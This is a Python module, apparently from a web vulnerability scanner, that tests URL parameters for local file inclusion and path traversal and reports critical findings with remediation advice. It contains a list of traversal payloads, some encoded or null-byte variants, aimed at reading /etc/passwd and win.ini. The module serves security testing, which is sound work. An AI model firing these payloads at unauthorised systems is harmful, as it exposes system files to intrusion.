"""Local File Inclusion / path traversal detection (aggressive mode only)."""
import asyncio
from urllib.parse import urlencode, urlparse, parse_qs
from app.core.context import ScanContext
from app.core.finding import Finding
from app.core.severity import Severity

PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "../../../../../../etc/passwd%00",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "../../../../windows/win.ini",
]
# Signatures that confirm file contents were returned.
SIGNATURES = ["root:x:0:0:", "root:.*:0:0:", "[fonts]", "[extensions]", "; for 16-bit app support"]
# Parameters most likely to be file-related.
LIKELY = ["file", "page", "path", "include", "doc", "document", "template",
          "view", "load", "read", "download", "filename", "dir", "folder"]
MAX_TESTS = 20


async def run(ctx: ScanContext) -> list[Finding]:
    findings = []
    targets = ctx.param_targets()
    if not targets:
        return findings

    # Prioritise file-ish parameters.
    targets.sort(key=lambda t: 0 if any(k in t[1].lower() for k in LIKELY) else 1)

    sem = asyncio.Semaphore(6)
    tasks = []
    for i, (url, param) in enumerate(targets):
        if i >= MAX_TESTS:
            break
        tasks.append(_test_param(ctx, url, param, sem))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    seen = set()
    for r in results:
        if isinstance(r, Finding) and (r.url, r.title) not in seen:
            seen.add((r.url, r.title))
            findings.append(r)
    return findings


async def _test_param(ctx: ScanContext, url: str, param: str, sem: asyncio.Semaphore) -> Finding | None:
    base = url.split("?")[0]
    existing = {k: v[0] for k, v in parse_qs(urlparse(url).query).items()}

    for payload in PAYLOADS:
        inj = {**existing, param: payload}
        test_url = f"{base}?{urlencode(inj, safe='/.%')}"
        try:
            async with sem:
                r = await ctx.client.get(test_url)
        except Exception:
            continue

        low = r.text.lower()
        if "root:x:0:0:" in low or ("[fonts]" in low and "[extensions]" in low):
            return Finding(
                title=f"Local File Inclusion in '{param}'",
                description=f"The '{param}' parameter allows reading arbitrary local files via path traversal.",
                severity=Severity.CRITICAL,
                category="Active / LFI",
                evidence=f"Request: {test_url}\nLeaked system file contents (e.g. /etc/passwd).",
                recommendation="Never pass user input to filesystem calls. Use an allowlist of permitted files "
                               "and canonicalise paths.",
                url=test_url,
                cvss=9.1,
            )
    return None
